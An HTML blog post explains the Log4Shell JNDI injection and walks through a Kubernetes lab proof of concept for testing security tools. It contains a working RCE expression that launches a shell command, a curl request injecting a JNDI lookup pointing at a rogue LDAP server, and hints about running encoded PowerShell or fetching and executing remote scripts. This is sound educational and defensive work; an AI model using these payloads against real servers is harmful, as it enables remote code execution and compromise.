<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Log4j 2 vulnerabilities, part II: Kubernetes POC" /><meta property="og:locale" content="en" /><meta name="description" content="A technical deep dive into the Log4j 2 vulnerability, and experiment with a Kubernetes proof of concept." /><meta property="og:description" content="A technical deep dive into the Log4j 2 vulnerability, and experiment with a Kubernetes proof of concept." /><link rel="canonical" href="https://vicenteherrera.com/blog/log4j-part-ii/" /><meta property="og:url" content="https://vicenteherrera.com/blog/log4j-part-ii/" /><meta property="og:site_name" content="The Vlog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-02-01T22:25:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Log4j 2 vulnerabilities, part II: Kubernetes POC" /><meta name="twitter:site" content="@v1z3n" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-07-01T13:16:51+02:00","datePublished":"2022-02-01T22:25:00+01:00","description":"A technical deep dive into the Log4j 2 vulnerability, and experiment with a Kubernetes proof of concept.","headline":"Log4j 2 vulnerabilities, part II: Kubernetes POC","mainEntityOfPage":{"@type":"WebPage","@id":"https://vicenteherrera.com/blog/log4j-part-ii/"},"url":"https://vicenteherrera.com/blog/log4j-part-ii/"}</script><meta name="twitter:description" content="A technical deep dive into the Log4j 2 vulnerability, and experiment with a Kubernetes proof of concept. "><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://vicenteherrera.com/blog/images/featured/hacker-log4j.jpg"><title>Log4j 2 vulnerabilities, part II: Kubernetes POC | The Vlog</title><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/blog/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="The Vlog"><meta name="application-name" content="The Vlog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/blog/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/blog/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/blog/" alt="avatar" class="mx-auto"> <img src="/blog/v.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/blog/">The Vlog</a></div><div class="site-subtitle font-italic">Vicente's blog about security and personal stuff</div></div><ul class="w-100"><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blog/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/blog/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/blog/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/blog/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/vicenteherrera" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/v1z3n" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/vicenteherrera" aria-label="linkedin" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="/blog/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/blog/"> Home </a> </span> <span>Log4j 2 vulnerabilities, part II: Kubernetes POC</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Log4j 2 vulnerabilities, part II: Kubernetes POC</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Vicente Herrera </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Feb 1, 2022, 10:25 PM +0100" >Feb 1, 2022<i class="unloaded">2022-02-01T22:25:00+01:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Jul 1, 2023, 1:16 PM +0200" >Jul 1<i class="unloaded">2023-07-01T13:16:51+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1745 words">9 min read</span></div></div><div class="post-content"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1878 1106'%3E%3C/svg%3E" data-proofer-ignore data-src="/blog/images/featured/hacker-log4j.jpg" class="preview-img" alt="A hacker exploits a Log4j 2 server" width="1878" height="1106"><p><em>Sorry, I couldn’t resist using a photo of a masked man operating in the dark several computers while standing up. It won’t happen again.</em></p><p>In this second post about the Log4j 2 vulnerabilities, I will describe <strong>technical details</strong> of the <em>remote code execution</em>, as well as present a <strong>proof of concept</strong> using <strong>Kubernetes</strong> that is very easy to deploy, safe to run in a test environment, and very useful to test security tools, fixes, and mitigations.</p><p>To learn more about Log4j and vulnerabilities, don’t forget to visit also my other posts:</p><ul><li><a href="/blog/log4j-part-i/" target="_blank">Part I: History</a><li><a href="/blog/log4j-part-ii/">Part II: Kubernetes POC</a> (this post)<li><a href="/blog/log4j-part-iii/">Part III: Prevention, mitigation, and fixing</a></ul><h2 id="how-does-the-exploit-work">How does the exploit work</h2><p>It requires the combination of an old vulnerability/misconfiguration not patched in Java for JNDI, and another old but recently discovered one in Log4J 2.</p><p>The <strong>Java Naming and Directory Interface (JNDI)</strong> is an API that allows you to interface with several naming and directory services, like <em>Lightweight Directory Access Protocol</em> (LDAP) or <em>Remote Method Invocation</em> (RMI), to look up data and resources.</p><p>For example, using the JNDI string <code class="language-plaintext highlighter-rouge">ldap://malicious.com/object</code> we are looking into the <code class="language-plaintext highlighter-rouge">malicious.com</code> domain using the LDAP protocol for information on the resource named “object”.</p><p>The <strong>Log4j 2</strong> library includes the ability to execute <em>lookups</em>, as a way to add values at arbitrary places, using a plugging that implements the <code class="language-plaintext highlighter-rouge">StrLookup</code> interface. For JNDI, those lookups were enabled by default until version 2.17. When you log a string that contains a dollar sign followed by brackets, what is inside of that will get resolved using JNDI. For example:</p><div class="language-java highlighter-rouge"><div class="code-header"> <span text-data=" Java "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">log</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="s">"${ldap://malicious.com/a}"</span><span class="o">)</span>
</pre></table></code></div></div><p>The problem comes when you log information that comes from a user, they may include that string crafted in a way to trigger the server to execute the lookup call if you don’t sanitize it. It can be as simple as including the lookup string in the URL or <code class="language-plaintext highlighter-rouge">user-agent</code> field of a browser or a <em>CURL</em> call. But not only that, anything that would be logged by a server can be used to inject the lookup string, like <a href="https://twitter.com/_JohnHammond/status/1469255402290401285" target="_blank">the text you are sending in a chat</a>, or even by setting it as <a href="https://twitter.com/chvancooten/status/1469340927923826691" target="_blank">the name of an iPhone device</a>.</p><p><img data-proofer-ignore data-src="/blog/images/2022/log4shell-killchain.png" alt="Log4j 2 vulnerability exploitation sequence" title="Log4j 2 vulnerability exploitation sequence" class="shadow" /> <em>Log4j 2 vulnerability exploitation sequence</em></p><p>One of the data types that can be returned on LDAP or RMI call is a URI pointing to a Java class. If the class is unknown on the local Java execution context, you can specify in the <code class="language-plaintext highlighter-rouge">javaFactory</code> field a deserialization factory class that has to exist on the attacked server, implements <code class="language-plaintext highlighter-rouge">javax.naming.spi.ObjectFactory</code> and have at least a <code class="language-plaintext highlighter-rouge">getObjectInstance</code> method.</p><p>So for a successful attack, you can use the javax.el.ELProcessor class that has an <code class="language-plaintext highlighter-rouge">eval</code> method that you force to be executed on deserialization, relying for example on the <code class="language-plaintext highlighter-rouge">org.apache.naming.factory.BeanFactory</code> factory class to create and execute it. See <a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank">additional details in this article</a>. Different base Java environments (Tomcat, Websphere, etc) may use a different existing factory class to succeed. Then, the code to be executed that give us ultimate <em>remote code execution</em> can be something like this:</p><div class="language-java highlighter-rouge"><div class="code-header"> <span text-data=" Java "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c1">// Malicious expression on code deserialization for arbitrary code execution </span>
<span class="o">{</span><span class="s">""</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">forName</span><span class="o">(</span><span class="s">"javax.script.ScriptEngineManager"</span><span class="o">).</span><span class="na">newInstance</span><span class="o">().</span><span class="na">getEngineByName</span><span class="o">(</span><span class="s">"JavaScript"</span><span class="o">).</span><span class="na">eval</span><span class="o">(</span><span class="s">"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','touch /root/test.txt']).start()"</span><span class="o">)}</span>
</pre></table></code></div></div><p>Oracle included in the past improvements on Java to try to fix the JNDI vulnerability that were not succesfull:</p><p>📅<strong>2015-10-21</strong>: <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-4902">CVE‑2015‑4902</a> published without specific details.<br /> 📅<strong>2016-08-03</strong>: <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank">BlackHat USA 2016 presentation</a> showcasing <a href="https://www.youtube.com/watch?v=Y8a5nB-vy78&amp;t=1529s" target="_blank">JNDI injection Remote Code Execution</a> for the previous CVE.<br /> 📅<strong>2017-01-17</strong>: Oracle updates Java to 8u121. Adds codebase restrictions to RMI, where <code class="language-plaintext highlighter-rouge">classFactoryLocation</code> is not used for deserialization. LDAP is still vulnerable, and <code class="language-plaintext highlighter-rouge">javaFactory</code> is still usable to use for RCE. <br /> 📅<strong>2018-10-16</strong>: Oracle updates Java to 8u191. Same <code class="language-plaintext highlighter-rouge">classFactoryLocation</code> restriction added also to LDAP. <code class="language-plaintext highlighter-rouge">javaFactory</code> is still usable to use for RCE on both RMI and LDAP to this day.</p><p>Read the full Log4j vulnerability history on the previous article “<a href="/blog/log4j-part-i/" target="_blank">Log4j part I: History</a>”.</p><h2 id="kubernetes-proof-of-concept">Kubernetes Proof of Concept</h2><p>Today several proofs of concept have been created for the Log4j 2 vulnerability, as well as for setting up a malicious LDAP server. I have combined two very interesting ones to create my own version that runs on Kubernetes, that we can use to do additional test on (see part III of this article series).</p><p><a href="https://github.com/vicenteherrera/log4shell-kubernetes" target="_blank">https://github.com/vicenteherrera/log4shell-kubernetes</a></p><p>You can test this yourself using your preferred Kubernetes service on the cloud, online using a free <a href="https://github.com/vicenteherrera/log4shell-kubernetes#try-everything-using-okteto" target="_blank">Okteto</a> account, or locally (using Minikube, Kind, etc). Even if you are not very interested in using Kubernetes to test this, this procedure is very simple to run.</p><p>As an example, let’s start <a href="https://minikube.sigs.k8s.io/docs/start/" target="_blank">Minikube</a> to use as target cluster:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>minikube start
</pre></table></code></div></div><p>To deploy the vulnerable Log4j 2 application, and the malicious LDAP server, you don’t even have to clone or download the repository or build container images, just execute the following in your test cluster.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>kubectl apply <span class="nt">-f</span> https://raw.githubusercontent.com/vicenteherrera/log4shell-kubernetes/main/vulnerable-log4j.yaml
kubectl apply <span class="nt">-f</span> https://raw.githubusercontent.com/vicenteherrera/log4shell-kubernetes/main/rogue-jndi.yaml
</pre></table></code></div></div><p>This will deploy for Kubernetes objects:</p><ul><li><code class="language-plaintext highlighter-rouge">vulnerable-log4j</code> service, that exposes <code class="language-plaintext highlighter-rouge">vulnerable-log4j-app</code> deployment, that deploys a pod running <code class="language-plaintext highlighter-rouge">quay.io/vicenteherrera/log4shell-vulnerable-app</code> container image.<li><code class="language-plaintext highlighter-rouge">rogue-jndi</code> service, that exposes <code class="language-plaintext highlighter-rouge">rogue-jndi-app</code> deployment, that deploys a pod running <code class="language-plaintext highlighter-rouge">quay.io/vicenteherrera/rogue-jndi</code> container image.</ul><p>Everything will be deployed to the current namespace, and as we are not attaching any ingress or load balancer. A more realistic scenario would be to deploy only the vulnerable application on the cluster, expose it to the internet, and deploy a different server for the rogue JNDI server and starter attack. But this way the workloads will not be exposed to the global Internet, and the execution of the attack will not be any different.</p><p>You can check the logs of each service to monitor what’s happening with them:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c"># run on different terminals</span>
kubectl logs service/rogue-jndi <span class="nt">-f</span>
kubectl logs service/vulnerable-log4j <span class="nt">-f</span>
</pre></table></code></div></div><p>Looking at the rogue-jndi service log, we see it tells us that to execute the remote code in Tomcat, we should use the string <code class="language-plaintext highlighter-rouge">${jndi:ldap://rogue-jndi:1389/o=tomcat}</code>.</p><p>To have Log4j 2 log that string, you can use a disposable pod to run on the same cluster. From it you can send a CURL request to the vulnerable service with a <code class="language-plaintext highlighter-rouge">X-Api-Version</code> parameter of the header of the call that includes the string. The vulnerable application will try to store it in its log, and the remote code execution will be triggered.</p><p>To do this, we again deploy to the same namespace a pod with CURL and shell access. This way we are triggering the attack without having to expose everything to all Internet as explained before, and the only difference would be the URL to use for a realistic attack would be the one for the public IP address of the service.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>kubectl run my-shell <span class="nt">--rm</span> <span class="nt">-it</span> <span class="nt">--image</span> curlimages/curl <span class="nt">--</span> sh
curl vulnerable-log4j:8080 <span class="nt">-H</span> <span class="s1">'X-Api-Version: ${jndi:ldap://rogue-jndi:1389/o=tomcat}'</span>
</pre></table></code></div></div><p>The <a href="https://github.com/vicenteherrera/log4shell-kubernetes/blob/main/Dockerfile-rogue-jndi" target="_blank">rogue-jndi service Dockerfile container image definition</a> includes in the CMD procedure the remote code to be executed when it triggers its upload. It’s a simple command to write to a <code class="language-plaintext highlighter-rouge">/root/test.txt</code> file.</p><p>To validate the attack was successful, let’s check what is in the <code class="language-plaintext highlighter-rouge">/root/</code> directory of the vulnerable application:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>kubectl <span class="nb">exec </span>service/vulnerable-log4j <span class="nt">-it</span> <span class="nt">--</span> <span class="nb">cat</span> /root/test.txt
</pre></table></code></div></div><p>You should see the file exists and include the date and time of each time you have triggered the attack.</p><h2 id="poc-considerations">POC considerations</h2><p>For the vulnerable app, after testing several options I’ve chosen <a href="https://github.com/christophetd/log4shell-vulnerable-app">github.com/christophetd/log4shell-vulnerable-app</a> because it includes Gradle for dependency management and you can build your own container image with the provided Dockerfile. Other repositories only included the compressed <code class="language-plaintext highlighter-rouge">.war</code> file, claiming to use a pom.xml for maven that can’t be used to rebuild the war because old dependencies not being available (they may have used a local cache of them). Others just include the container files without all the files required for building the application. The chosen POC is better because we can make modifications to the source code, the Java configuration, or the base Java container image to test the efect on the vulnerability.</p><p>For the malicious JNDI server, I’ve chosen <a href="https://github.com/veracode-research/rogue-jndi">github.com/veracode-research/rogue-jndi</a>. It allows you to respond with different attack strings for different Java application servers using the same single port. Another nice alternative is <a href="https://github.com/welk1n/JNDI-Injection-Exploit">github.com/welk1n/JNDI-Injection-Exploit</a>.</p><p>Rogue-jndi lacked a Dockerfile to deploy using a container, so I provide one that just creates a <code class="language-plaintext highlighter-rouge">/root/test.txt</code> file on the compromised workload on a successful attack. You can modify it to do different scenarios. But I warn you, you can’t use <code class="language-plaintext highlighter-rouge">&amp;&amp;</code>, <code class="language-plaintext highlighter-rouge">;</code>, <code class="language-plaintext highlighter-rouge">|</code> or other ways of chaining different command as it has been built. When interpreting the string, it will be treated as a single command with everything else as parameters for it. Go figure, a vulnerability exploitation example that takes very seriously string sanitization of its parameters. For compromising <em>Windows</em> that is not a problem, a single <code class="language-plaintext highlighter-rouge">powershell.exe -encodedCommand &lt;base64 string&gt;</code> will execute anything. For <em>Linux</em>, you can hardcode other command executions directly on the <code class="language-plaintext highlighter-rouge">rogue-jndi</code> source code instead of relying on what is passed as a parameter when it starts. Or just modify the code and send different URLs with CURL for different commands to execute. There are several ways to succeed in executing a <code class="language-plaintext highlighter-rouge">wget</code> or <code class="language-plaintext highlighter-rouge">curl</code> to download a bash script, and then execute it in a second command.</p><h2 id="thanks">Thanks</h2><p>Thanks to Brian Klug for the original featured image:</p><ul><li>Title: Anonymous Hacker<li>Author: <a href="https://www.flickr.com/photos/brianklug/" target="_blank">Brian Klug</a><li>URL: <a href="https://www.flickr.com/photos/brianklug/6870002408" target="_blank">flickr.com/photos/brianklug/6870002408/</a><li>License: <a href="https://creativecommons.org/licenses/by-nc/2.0/" target="_blank">Attribution-NonCommercial 2.0 Generic (CC BY-NC 2.0)</a><li>Modifications made: Added sticker “My other computer is your Log4j server” to laptop cover.</ul><h2 id="conclusion">Conclusion</h2><p>JNDI used for <em>remote code execution</em> is an old story that hasn’t been patched in a long time. Log4j 2 failing to sanitize strings is vulnerable to this kind of attack. Using the <a href="https://github.com/vicenteherrera/log4shell-kubernetes" target="_blank">GitHub repository I’ve created</a>, you can in very few steps reproduce the attack to experiment and test security tools.</p><p>Read more about History of Log4j vulnerabilities and JNDI on “<a href="/blog/log4j-part-i/" target="_blank">Part I: History</a>” of this article series. Be ready for part III, where we evaluate and put to the test fixes and mitigations, which work, which doesn’t.</p><p>If there is some information I missed in this article, or you just want to chat with me, <a href="https://twitter.com/v1z3n" target="_blank"><i class="fab fa-twitter" style="color:#1DA1F2;" aria-hidden="true"></i> let me know</a>.</p><p>And if you found this information extremely useful to you, why not let others know? <a href="https://twitter.com/share?url=https://vicenteherrera.com/log4j-part-ii/&amp;title=Log4j+2+vulnerabilities%2C+part+II%3A+Kubernetes+POC" target="_blank"><i class="fab fa-twitter" style="color:#1DA1F2;" aria-hidden="true"></i> Share it in a tweet</a>, or <a href="https://ko-fi.com/R5R77UF84" target="_blank">invite me to coffee</a>!</p><hr /><p><em>Vicente Herrera is a software engineer working on cloud native cybersecurity (cloud, containers, Kubernetes).<br /> His latest job is cybersecurity specialist at <a href="https://control-plane.io" target="_blank">Control Plane</a>, and previously was Product Manager at <a href="https://sysdig.com" target="_blank">Sysdig</a>.<br /> He is the published author of <a href="https://www.oreilly.com/library/view/building-intelligent-cloud/9781492052319/" target="_blank">Building Intelligent Cloud Application</a> (O’Reilly, 2019) about using serverless and machine learning services with Azure.<br /> He has been involved in several research projects for using AI on healthcare and automatic code generation.</em></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/blog/categories/security/'>Security</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/blog/tags/cve/" class="post-tag no-text-decoration" >CVE</a> <a href="/blog/tags/log4j/" class="post-tag no-text-decoration" >Log4j</a> <a href="/blog/tags/vulnerability/" class="post-tag no-text-decoration" >vulnerability</a> <a href="/blog/tags/remote-code-execution/" class="post-tag no-text-decoration" >remote code execution</a> <a href="/blog/tags/jndi/" class="post-tag no-text-decoration" >JNDI</a> <a href="/blog/tags/cve-2021-44228/" class="post-tag no-text-decoration" >CVE-2021-44228</a> <a href="/blog/tags/cve-2015-4902/" class="post-tag no-text-decoration" >CVE‑2015‑4902</a> <a href="/blog/tags/cve-2015-4902/" class="post-tag no-text-decoration" >CVE‑2015‑4902</a> <a href="/blog/tags/log4shell/" class="post-tag no-text-decoration" >log4shell</a> <a href="/blog/tags/rce/" class="post-tag no-text-decoration" >RCE</a> <a href="/blog/tags/proof-of-concept/" class="post-tag no-text-decoration" >proof of concept</a> <a href="/blog/tags/security/" class="post-tag no-text-decoration" >security</a> <a href="/blog/tags/cybersecurity/" class="post-tag no-text-decoration" >cybersecurity</a> <a href="/blog/tags/kubernetes/" class="post-tag no-text-decoration" >Kubernetes</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Log4j 2 vulnerabilities, part II: Kubernetes POC - The Vlog&url=https://vicenteherrera.com/blog/log4j-part-ii/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Log4j 2 vulnerabilities, part II: Kubernetes POC - The Vlog&u=https://vicenteherrera.com/blog/log4j-part-ii/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://vicenteherrera.com/blog/log4j-part-ii/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/blog/log4j-part-iii/">Log4j 2 vulnerabilities, part III: Prevention, mitigation and fixing</a><li><a href="/blog/log4j-part-i/">Log4j 2 vulnerabilities, part I: History</a><li><a href="/blog/log4j-part-ii/">Log4j 2 vulnerabilities, part II: Kubernetes POC</a><li><a href="/blog/what-is-a-cve/">What is a CVE?</a><li><a href="/blog/first-post/">Hi everybody... welcome to my blog!</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/blog/tags/cybersecurity/">cybersecurity</a> <a class="post-tag" href="/blog/tags/cve/">CVE</a> <a class="post-tag" href="/blog/tags/security/">security</a> <a class="post-tag" href="/blog/tags/cve-2021-44228/">CVE-2021-44228</a> <a class="post-tag" href="/blog/tags/cve-2015-4902/">CVE‑2015‑4902</a> <a class="post-tag" href="/blog/tags/log4j/">Log4j</a> <a class="post-tag" href="/blog/tags/log4shell/">log4shell</a> <a class="post-tag" href="/blog/tags/rce/">RCE</a> <a class="post-tag" href="/blog/tags/remote-code-execution/">remote code execution</a> <a class="post-tag" href="/blog/tags/vulnerability/">vulnerability</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 